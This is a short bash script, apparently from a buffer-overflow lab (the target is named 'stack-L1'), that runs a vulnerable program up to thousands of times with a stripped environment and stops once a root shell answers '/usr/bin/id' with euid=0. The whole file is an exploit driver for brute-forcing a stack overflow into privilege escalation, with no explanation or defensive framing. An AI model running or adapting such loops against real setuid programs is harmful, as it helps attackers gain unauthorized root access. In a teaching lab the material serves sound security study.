#!/bin/bash

# Repeatedly run stack-L1 and stop at first successful root shell command.
# Usage: ./brute-force-id.sh [max_attempts]

max_attempts=${1:-5000}
attempt=0

while [[ $attempt -lt $max_attempts ]]; do
  attempt=$((attempt + 1))
  out=$(printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1 2>/dev/null || true)

  if echo "$out" | grep -q 'euid=0(root)'; then
    echo "SUCCESS after $attempt attempts"
    echo "$out"
    exit 0
  fi

  if (( attempt % 200 == 0 )); then
    echo "attempts: $attempt"
  fi
done

echo "No success after $max_attempts attempts"
exit 1
